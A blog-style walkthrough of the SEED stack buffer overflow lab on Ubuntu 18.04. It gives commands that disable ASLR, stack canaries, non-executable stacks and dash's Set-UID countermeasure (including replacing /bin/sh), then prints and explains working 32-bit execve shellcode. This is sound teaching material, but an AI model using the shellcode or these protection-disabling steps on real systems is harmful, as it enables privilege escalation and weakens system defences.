---
layout: post
title: Stack Overflow In Ubuntu 18.04
categories: [Program Security, Attack]
description: a thorough hand-on try on overflow attack
keywords: stack overflow, function, Linux
---

## Stack Overflow In Ubuntu 18.04

### Followed the [*Seed Lab*](http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Software/Buffer_Overflow/)

This article is written by Tianyu Zhou in May, 2019. Most of the technics are from the seed lab provided by Dr Wenliang Du on his websites, so remember to notice his copyright.

Copyright © Wenliang Du, Syracuse University

### get root previlege in X86 system

Here we use the Ubuntu 18.04 64 bit for example.

At first, there are several rules of the runtime memory use when we call a function.

Unlike the global variables or static values, the local variables are stored on the *stack*, which is below the *return address*.

When we use some function without boundary checking, the *return address* can be **overwritten** and **jump** to somewhere else rather than the normal destination.

#### Preparation

There are several mechanisms in the systems that protects from **Stack Overflow**, at the beginning of this Lab, we will disable them to make things more easier.

##### Address Space Randomization

First of all, we will turn of the randomization of the address space, this mechanism is made to make the address more hard to guesss.

*Ubuntu* and several other *Linux-based systems* uses **address space ran-domization** to randomize *the starting address of heap and stack*. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable this feature using the following command:

```shell
$ sudo sysctl -w kernel.randomize_va_space=0
```

##### The StackGuard Protection Scheme

The GCC compiler implements a security mechanism called *Stack-Guard* to prevent buffer overflows. In the presence of this protection, buffer overflow attacks will not work. We can disable this protection during the compilation using the-fno-stack-protectoroption.  

In the system security theorem, this mechanism calls the canary. Between the local variables and former frame pointer which $ebp points to, gcc compiler automatically add a piece of code, which is saved as the global variable in the heap at the runtime. When it is time for return, the program will first check the canary whether it equals to the global value stored in the heap. If not, the process will terminate. This mechanism is set up in default.

For example, to compile a program example.c with Stack-Guard disabled, we can do the following:

```shell
$ gcc -fno-stack-protector example.c
```

##### Non-Executable Stack

*Ubuntu* used to allow executable stacks, but this has now changed:  the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header.

Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable.  This marking is done automatically by the recent versions of gcc, and by default, stacks are set to be *non-executable*. 

To change that, use the following option when compiling programs:

```shell
# For executable stack
$ gcc -z execstack -o test test.c
# For non-executable stack
$ gcc -z noexecstack -o test test.c
```

In this lab, we will use the execstack option at first.

##### Configuring /bin/sh

In Ubuntu 18.04, the file `/bin/sh` is a link to the `/bin/dash`. The *dash shell* has a countermeasure that prevents itself from being executed in a Set-UID process.  Basically, if dash detects that it is executed in a Set-UID process, it immediately changes the effective user ID to the process’s real user ID, essentially dropping theprivilege. 

Since  our  victim  program  is  a Set-UID program,  and our attack relies on running `/bin/sh`,  the countermeasure  in `/bin/dash` makes our attack more difficult. Therefore, we will link `/bin/sh` to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit more effort, the countermeasure in `/bin/dash` can be easily defeated). 

At first we should install a shell program called `zsh` have installed a shell program called `zsh`. After that, we link `/bin/sh` to `zsh` :

```shell
$ sudo apt-get install zsh
$ sudo rm /bin/sh
$ sudo ln -s /bin/zsh /bin/sh
```

#### Runing a Shell Code

First, let's look at how shellcode work to get a root privilege. Here is a c file that execute the shell code `/bin/sh`.

```c
// shell.c
#include <stdio.h>
int main() {
	char *name[2];
  	name[0] = "/bin/sh";
  	name[1] = NULL;
  	execve(name[0], name, NULL);
 	return 0;
}
```

Remember that this code is using the x86 gcc lib, so if you want to complie on the 64 bit system, you have to use `-m32` option while use `gcc`. At the first time using this, it is necessary to install some lib.

```shell
# for c file
$ sudo apt-get install gcc-multilib
# for c++ file
$ sudo apt-get install g++-multilib
```

After install `multilib`, we can use the following instruction to compile and run the code.

```shell
$ gcc -m32 -o shell shell.c
$ ./shell
$ 
```

When we run the shell file, we actually execute the /bin/sh shell code, and enter to the shell interface. We can enter into the shell interface by another approach which run the code in the stack.

Here we create a file named *call_shellcode.c*, and this is its content.

```c
/* call_shellcode.c  */
/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
  	"\x31\xc0"             /* xorl    %eax,%eax              */
  	"\x50"                 /* pushl   %eax                   */
  	"\x68""//sh"           /* pushl   $0x68732f2f            */
  	"\x68""/bin"           /* pushl   $0x6e69622f            */
  	"\x89\xe3"             /* movl    %esp,%ebx              */
  	"\x50"                 /* pushl   %eax                   */
  	"\x53"                 /* pushl   %ebx                   */
  	"\x89\xe1"             /* movl    %esp,%ecx              */
  	"\x99"                 /* cdq                            */
  	"\xb0\x0b"             /* movb    $0x0b,%al              */
  	"\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv)
{
  	 char buf[sizeof(code)];
  	 strcpy(buf, code);
  	 (*(void(*)( ))code)( );
} 
```

In this code, we change the variable *buf* into the pointer of a function. When the code runs to this line 25, the CPU actually run the code we put into the buf. We call this kind of code *shell code*, and if you want to view more like this, please visit [Exploit Database](https://www.exploit-db.com/shellcodes).

Again, we compile this code by gcc. Although we run the code on the stack, it's not necessary for us to add `-z execstack` option, maybe in the -m32 option, the execstack is default, but it's more appropriate to include the option to make sure the code could run.

```shell
$ gcc -m32 -z execstack -o call_shellcode call_shellcode.c
$ ./call_shellcode
$ 
```

After we run the code, we get shell again.

Here we take a short time to read the content inside the `code[]`.

At first, let's take a look at the purpose of this code, and the registers we have to focus on.

```c
		execve("/bin/sh", argv, 0);
					|        |    |
				  %ebx      %ecx  %edx
		
		%eax -> store variables
		%al  -> part of %eax, to select the type of system call
		%esp -> the stack pionter
```

The purpose of this code is to call the `execve` system call to start a `/bin/sh` shell.

Then we take a deep look at the code.

```c
  	"\x31\xc0"             /* xorl    %eax,%eax              */
  	"\x50"                 /* pushl   %eax                   */
```

At first, we make the `%eax` register to `zero` by do *xor* option with itself. The reason why we don't use `move zero` is that we can't `strcpy` the string after the value `\0`. Then we push it into the stack.

```c
  	"\x68""//sh"           /* pushl   $0x68732f2f            */
  	"\x68""/bin"           /* pushl   $0x6e69622f            */
```

Next, we push the string value to the stack, notice the line 1, we actually push the string `"//sh"`, this is because we have to align the memory space, and fortunately when run the shell code, `"//sh"` is equal to `"/sh"`.

Another point we should notice is that now the *stack pointer* which stores in the `%esp` register points to the start address of the String `/bin//sh`.

```c
  	"\x89\xe3"             /* movl    %esp,%ebx              */
```

Now, the register store the start address of `"/bin//sh"`, which can not decide in compile time.

```c
	"\x50"                 /* pushl   %eax                   */
 	"\x53"                 /* pushl   %ebx                   */
	"\x89\xe1"             /* movl    %esp,%ecx              */
```

These lines actually form the stack like this:

```
	addr+0		0
	addr+4		//sh
	addr+8		/bin		<- %ebx = addr+8
	addr+12		0
	addr+16		addr+8		<- %esp = addr+16
```

So when we move `%esp` to `%ecx`, we actually form the value `argv[]`, where `argv[0]` contain the start address of `"/bin//sh"`, and `argv[1]` is `zero`.

```c
	"\x99"                 /* cdq                            */
```

This instruction put `zero` into `%edx`.

```
  	"\xb0\x0b"             /* movb    $0x0b,%al              */
  	"\xcd\x80"             /* int     $0x80                  */
```

`0x0b` means the No.11 entry in the system call table, which is the `execve` function. The line 2 call the system call. These two line triggers the `execve` system call.